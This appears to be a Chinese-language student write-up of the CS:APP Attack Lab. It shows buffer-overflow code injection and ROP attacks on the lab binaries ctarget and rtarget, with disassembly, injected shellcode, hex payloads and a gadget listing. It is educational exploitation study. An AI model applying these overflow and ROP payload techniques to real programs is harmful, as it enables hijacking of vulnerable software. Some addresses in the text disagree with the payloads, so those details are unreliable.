## 介绍

### 实验目的

本实验旨在了解和学习缓冲区溢出攻击的两种方式：

* Code Injection Attacks(CI)：代码注入攻击
* Return-Oriented Programming(ROP): ROP攻击

### 文件介绍

* README.md: 文件描述；
* ctarget: 可执行文件，存在CI漏洞，完成实验phase 1-3；
* rtarget: 可执行文件，存在ROP漏洞，完成实验phase 4-5;
* hex2raw: 将十六进制转换为对应的输入字符串；
* cookie.txt: 实验中需要用到的8位十六进制数；
* farm.c: gadgets的源码。

### 程序说明

ctarget和rtarget都会从标准输入中读取字符串，函数如下：

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

```

Gets类似于库函数gets，它会从标准输入读取字符串（“\n”作为结尾）存储到buf中，且不会检查缓冲区和字符串的长度，因此存在缓冲区溢出漏洞。

getbuf会在test中被调用：

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```



ctarget和rtarget的使用：

> Both CTARGET and RTARGET take several different command line arguments: 
>
> -h: Print list of possible command line arguments 
>
> -q: Don’t send results to the grading server 
>
> -i FILE: Supply input from a file, rather than from standard input

使用时带上-q参数以避免远程服务器校验。



## 实验目标

### Part 1: Code Injection Attacks

这一阶段的目标程序是ctarget，其具有如下特点：

* 栈地址固定
* 栈具有可执行权限

#### Phase 1：getbuf执行后去调用touch1，而不再是返回test；

程序中存在代码：

```c
void touch1()
{
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}

```



#### Phase2: getbuf执行后去调用touch2;

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}

```

#### Phase 3:  getbuf执行后去调用touch3;

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}


void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

### Part 2： Return-Oriented Programming

目标程序是rtarget，与ctarge相比，其特点是：

* 栈空间地址是随机的
* 栈不可执行

ROP的原理是利用堆栈来控制返回地址，让进程跳转到精心挑选的指令或指令片段处，而这些指令或指令片段往往是已存在于程序代码段的，故而可以绕过ALSR和DEP。

在rtarget中，可供利用的gadget都在start_farm和end_farm之间。

#### Phase 4: getbuf执行后去调用touch2;

#### Phase 5: getbuf执行后去调用touch3;



## 实验过程

### CI(phase 1)

使用objdump 反汇编看一下ctarget：

```shell
objdump -d ctarget
```

找到getbuf函数，如图。可以看到函数内部在栈上申请了40bytes的空间，而后调用Gets读取输入，并将之存储到栈上。

![image-20220806160116333](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208061601064.png)

回忆一下关于栈帧的知识，getbuf调用Gets时（执行到0x4017ac）的栈空间如图:

![image-20220807083753223](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807083800.png)

我们要去调用touch1，只需要将返回地址替换为touch1的地址即可。从汇编指令可以看出getbuf调用Gets传递的参数就是此时的栈顶（rsp），即Gets会将读取的输入字符串存入栈顶为起始的地址中，且存储时方向是从低地址到高地址的。那么此处只需要用40 Bytes填充栈，而后就可以覆盖掉返回地址。

另外此处程序采用小端序存储，所以输入指令地址时需要将低位放在内存中的低地址处。最终设计出输入字符串：

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

执行：

```shell
hex2raw <attack1.txt >attack1raw.txt
ctarget -q -i attack1raw.txt
```

结果：

![image-20220807114205671](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220807114205.png)

### CI(phase 2)

这次需要调用touch2，从源码可以看到，需要将cookie作为参数传递进去。

回忆一下，汇编中传递参数的方式：寄存器和栈，会依次使用rdi、rsi、rdx、rcx、r8、r9等寄存器传递参数，更多的参数会使用栈来进行传递。

那么此处传参只需要在调用touch2前将cookie放入寄存器rdi中即可。

所以此处需要做的是：

* 修改返回地址为touch2的地址
* 将cookie放入寄存器rdi

修改返回地址在Phase 1已经做过，只需覆盖即可，那么剩下的就是修改寄存器了。比较容易想到的两种操控寄存器的方法是编写汇编指令和利用已有指令，那么先整理一下目前的条件：

* 栈地址固定
* 栈可执行

于是想到可以直接注入代码到栈上，通过注入代码操控寄存器的值，如此只需将返回地址修改为注入代码的地址、然后在注入代码中跳转touch2即可。

写出注入代码：

```assembly
mov $0x59b997fa, %rdi	;cookie存入rdi
push $0x4017ec			;touch2指令的地址入栈, 通过ret跳转到touch2
ret						;跳转到touch2
```

编译这段代码，然后反汇编得到对应的十六进制表示：

```shell
[root@machine target1]# gcc attack.s -c
[root@machine target1]# objdump -d attack.o

attack.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq
```

另外还需要得到注入代码的内存地址（即getbuf中的栈顶地址），以确定返回地址。

使用gdb进行调试，首先看一下反汇编得到的指令地址，要得到getbuf中的栈顶地址，我们可以在mov %rsp, %rdi指令处打断点，对应的指令地址为0x4017ac:

![image-20220808213607260](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213607.png)

![image-20220808213859401](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808213859.png)

可以看到栈顶地址为0x5561dc78，结合前面注入代码的是十六进制表示，最终可以得到整个输入字符串的十六进制表示：

```shell
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

执行：

```shell
hex2raw <attack2.txt >attack2raw.txt
ctarget -q -i attack2raw.txt
```

攻击成功：

![image-20220808214628387](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220808214628.png)

### CI(phase 3)

分析touch3的代码可以发现，touch3与touch2类似，仍旧是需要将cookie作为参数传递进去，但不同之处在于，touch2的参数类型为unsigned int，因此直接传递cookie本身即可，但touch3的参数类型为char *，需要将一个地址作为参数传递，而且touch3中进行的是字符串比较，而非数字类型的比较，所以还需要将cookie转换为对应的ascii码。

目前需要做的是：

* 将cookie放进内存，这一步通过输入字符串即可将cookie放到栈上
* 将cookie的地址放进rdi，然后调用touch3
* 覆盖getbuf的返回地址

整理目前的条件：

* 栈可执行
* 栈地址固定
* 并且在刚刚的phase 2成功完成了一次代码注入

因此，最先想到的方法就是参考phase 2，注入代码操控rdi，写出注入代码：

```assembly
pushw $0x6166
pushw $0x3739
pushw $0x3962
pushw $0x3935
mov %rsp, %rdi
push $0x4018fa
ret
```

编译后反汇编查看相应指令的十六进制表示：

```shell
[root@localhost target1]# objdump -d attack3.o 

attack3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	66 68 66 61          	pushw  $0x6166
   4:	66 68 39 37          	pushw  $0x3739
   8:	66 68 62 39          	pushw  $0x3962
   c:	66 68 35 39          	pushw  $0x3935
  10:	48 89 e7             	mov    %rsp,%rdi
  13:	68 fa 18 40 00       	pushq  $0x4018fa
  18:	c3                   	retq
```

得到最终的输入：

```shell
66 68 66 61 66 68 39 37
66 68 62 39 66 68 35 39
48 89 e7 68 fa 18 40 00 
c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

执行：

![image-20220809180142844](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/202208091801966.png)
=======


### ROP(phase 4)

​	这次的实验目标与phase 2相同，也是要调用touch2。不同之处在于，这次的目标程序rtarget被编译为随机栈地址和栈不可执行，因此之前CI的攻击方法失效，需要另找方法实现。其实这里的要求就是ROP的方法实现。

​	回忆一下为了调用touch2，需要做的事情：

* 输入cookie

* 将cookie从栈上放入rdi
* 覆盖栈上的返回地址

由于无法注入代码，那么为了操控寄存器，只能利用已有的指令，提示已经明确指出攻击所需要用到的gadgets都在start_farm和end_farm之间，因此可以看一下这个范围里的指令有哪些，这里我们借助工具（ROPgadget， 地址https://github.com/JonathanSalwan/ROPgadget.git）看一下（注意这里显示的指令是intel格式的）：

```shell
[root@VM target1]# ROPgadget --binary ./rtarget --range 0x401994-0x401ab2|grep -E 'mov|pop'
0x0000000000401998 : add bl, al ; mov eax, 0x909078fb ; ret
0x0000000000401996 : add byte ptr [rax], al ; add bl, al ; mov eax, 0x909078fb ; ret
0x0000000000401a8f : cmp al, 0xc3 ; mov eax, 0xc020ce88 ; ret
0x0000000000401a6c : fcmovnb st(0), st(3) ; mov dword ptr [rdi], 0xc391d189 ; ret
0x00000000004019f4 : fcmovnb st(0), st(3) ; mov eax, 0xc048d189 ; ret
0x0000000000401a31 : fcmovnb st(0), st(3) ; mov eax, 0xc938d189 ; ret
0x0000000000401a08 : loopne 0x4019cd ; mov dword ptr [rdi], 0xc908c288 ; ret
0x0000000000401a92 : mov dh, cl ; and al, al ; ret
0x0000000000401a0c : mov dl, al ; or cl, cl ; ret
0x00000000004019e1 : mov dword ptr [rdi], 0x9090d199 ; ret
0x00000000004019c3 : mov dword ptr [rdi], 0x90c78948 ; ret
0x0000000000401aab : mov dword ptr [rdi], 0x90e08948 ; ret
0x0000000000401a5a : mov dword ptr [rdi], 0x91e08948 ; ret
0x00000000004019b5 : mov dword ptr [rdi], 0x9258c254 ; ret
0x00000000004019fc : mov dword ptr [rdi], 0xc084d181 ; ret
0x0000000000401a97 : mov dword ptr [rdi], 0xc2e08948 ; ret
0x0000000000401a6e : mov dword ptr [rdi], 0xc391d189 ; ret
0x00000000004019bc : mov dword ptr [rdi], 0xc78d4863 ; ret
0x00000000004019ae : mov dword ptr [rdi], 0xc7c78948 ; ret
0x0000000000401a0a : mov dword ptr [rdi], 0xc908c288 ; ret
0x0000000000401a7c : mov dword ptr [rdi], 0xc908ce09 ; ret
0x0000000000401a75 : mov dword ptr [rdi], 0xd238c281 ; ret
0x0000000000401a2c : mov dword ptr [rdi], 0xdb08ce81 ; ret
0x000000000040199a : mov eax, 0x909078fb ; ret
0x00000000004019db : mov eax, 0x90c2895c ; ret
0x0000000000401a91 : mov eax, 0xc020ce88 ; ret
0x00000000004019f6 : mov eax, 0xc048d189 ; ret
0x0000000000401a18 : mov eax, 0xc1e08948 ; ret
0x00000000004019ca : mov eax, 0xc3905829 ; ret
0x0000000000401a33 : mov eax, 0xc938d189 ; ret
0x0000000000401a54 : mov eax, 0xc9c4c289 ; ret
0x0000000000401a4e : mov eax, 0xd208d199 ; ret
0x0000000000401aa5 : mov eax, 0xd220ce8d ; ret
0x0000000000401a68 : mov eax, 0xdb08d189 ; ret
0x0000000000401994 : mov eax, 1 ; ret
0x0000000000401a86 : mov eax, esp ; nop ; ret
0x0000000000401a07 : mov eax, esp ; ret
0x0000000000401a9a : mov eax, esp ; ret 0x8dc3
0x0000000000401a5d : mov eax, esp ; xchg ecx, eax ; ret
0x00000000004019a4 : mov ebx, 0x51878dc3 ; jae 0x401a04 ; nop ; ret
0x00000000004019b3 : mov ebx, 0xc25407c7 ; pop rax ; xchg edx, eax ; ret
0x0000000000401a34 : mov ecx, edx ; cmp cl, cl ; ret
0x0000000000401a69 : mov ecx, edx ; or bl, bl ; ret
0x0000000000401a70 : mov ecx, edx ; xchg ecx, eax ; ret
0x00000000004019b2 : mov edi, 0x5407c7c3 ; ret 0x9258
0x00000000004019c6 : mov edi, eax ; nop ; ret
0x00000000004019a3 : mov edi, eax ; ret
0x0000000000401a20 : mov edx, eax ; add cl, cl ; ret
0x00000000004019dd : mov edx, eax ; nop ; ret
0x0000000000401a42 : mov edx, eax ; test al, al ; ret
0x0000000000401a27 : mov esi, ecx ; cmp al, al ; ret
0x00000000004019ea : mov esi, ecx ; js 0x4019b7 ; ret
0x0000000000401a13 : mov esi, ecx ; nop ; nop ; ret
0x0000000000401a63 : mov esi, ecx ; xchg edx, eax ; ret
0x0000000000401aad : mov rax, rsp ; nop ; ret
0x0000000000401a06 : mov rax, rsp ; ret
0x0000000000401a99 : mov rax, rsp ; ret 0x8dc3
0x0000000000401a5c : mov rax, rsp ; xchg ecx, eax ; ret
0x00000000004019c5 : mov rdi, rax ; nop ; ret
0x00000000004019a2 : mov rdi, rax ; ret
0x00000000004019ab : pop rax ; nop ; ret
0x00000000004019b9 : pop rax ; xchg edx, eax ; ret
0x00000000004019dc : pop rsp ; mov edx, eax ; nop ; ret
0x0000000000401a01 : rol bl, 0x8d ; xchg dword ptr [rcx + 0x48], eax ; mov eax, esp ; ret
0x0000000000401aa9 : rol bl, cl ; mov dword ptr [rdi], 0x90e08948 ; ret
0x0000000000401a7a : rol bl, cl ; mov dword ptr [rdi], 0xc908ce09 ; ret
0x0000000000401a52 : rol bl, cl ; mov eax, 0xc9c4c289 ; ret
0x0000000000401aa3 : rol bl, cl ; mov eax, 0xd220ce8d ; ret
0x0000000000401a50 : ror dword ptr [rax], 1 ; rol bl, cl ; mov eax, 0xc9c4c289 ; ret
0x00000000004019f2 : shl dword ptr [rax], 1 ; fcmovnb st(0), st(3) ; mov eax, 0xc048d189 ; ret
0x0000000000401a84 : xchg dword ptr [rax], ecx ; mov eax, esp ; nop ; ret
0x0000000000401a04 : xchg dword ptr [rcx + 0x48], eax ; mov eax, esp ; ret
0x00000000004019a8 : xchg dword ptr [rcx + 0x73], edx ; pop rax ; nop ; ret
0x0000000000401a3a : xchg eax, ecx ; mov eax, esp ; ret
```

这里可以看到0x4019ab和0x4019a2处分别是pop和mov指令，并且可以操作rdi，所以可以考虑利用这两处指令完成操作。

梳理调用逻辑，这里需要的是：

* cookie入栈
* 执行pop，cookie存入rax
* 执行mov，cookie存入rdi
* 调用touch2

最后得到输入串：

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

攻击效果：

![image-20220814203244469](https://raw.githubusercontent.com/Abug0/Typora-Pics/master/pics/Typora20220814203251.png)

### ROP(phase 5)

（暂未完成）

## 参考文章

[attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

[Introduction to CSAPP（二十）：这可能是你能找到的最具捷径的attacklab了](https://zhuanlan.zhihu.com/p/104340864)

[CSAPP：Attack Lab —— 缓冲区溢出攻击实验](https://blog.csdn.net/qq_36894564/article/details/72863319)

[64位linux系统：栈溢出+ret2libc ROP attack](https://www.superweb999.com/article/1005924.html)

[缓冲区溢出：攻防对抗](https://github.com/YuZhang/Security-Courseware/blob/master/buffer-overflow/buffer-overflow-3.md)

[rop链攻击原理与思路(x86/x64)](https://bbs.pediy.com/thread-257238.htm)
